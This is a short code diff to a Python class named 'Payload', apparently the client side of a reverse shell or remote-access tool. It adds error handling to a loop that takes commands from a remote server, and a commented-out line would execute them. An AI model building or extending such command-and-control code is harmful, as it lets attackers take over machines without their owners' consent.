@@ -92,7 +92,12 @@ class Payload:
 
         while True:
             # receive the command from the server
-            command = ClientSocket.recv(self.BUFFER_SIZE).decode('utf-8', "ignore")
+            try:
+                command = ClientSocket.recv(self.BUFFER_SIZE).decode('utf-8', "ignore")
+            except socket.error as e:
+                print(str(e))
+                break
+            #command = ClientSocket.recv(self.BUFFER_SIZE).decode('utf-8', "ignore")
             splited_command = command.split()
             print(command)
             #output = subprocess.getoutput(command)
